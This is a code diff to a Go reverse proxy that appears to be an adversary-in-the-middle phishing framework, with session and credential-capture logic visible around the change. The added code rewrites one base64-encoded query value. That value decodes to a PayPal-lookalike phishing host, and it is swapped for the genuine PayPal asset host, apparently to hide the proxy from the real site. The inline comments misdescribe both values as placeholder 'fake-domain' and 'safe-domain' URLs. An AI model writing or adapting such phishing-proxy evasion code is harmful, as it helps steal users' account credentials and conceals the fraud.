@@ -689,7 +689,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// patch GET query params with original domains
-				if pl != nil {
+				/*if pl != nil {
 					qs := req.URL.Query()
 					if len(qs) > 0 {
 						for gp := range qs {
@@ -699,7 +699,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						req.URL.RawQuery = qs.Encode()
 					}
+				}*/
+				if pl != nil {
+					qs := req.URL.Query()
+					if len(qs) > 0 {
+						for gp := range qs {
+							for i, v := range qs[gp] {
+								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
+							if qs[gp][i] == "aHR0cHM6Ly9wYXlwYWxvYmplY3RzLndvcmtmaWxlLnRlY2g6NDQz" { // https://accounts.fake-domain.com:443
+								qs[gp][i] = "aHR0cHM6Ly93d3cucGF5cGFsb2JqZWN0cy5jb206NDQz" // https://accounts.safe-domain.com:443
+							}
+							}
+						}
+						req.URL.RawQuery = qs.Encode()
+					}
 				}
+				
 				//log.Info("Request Before Cred check: %v", req)
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
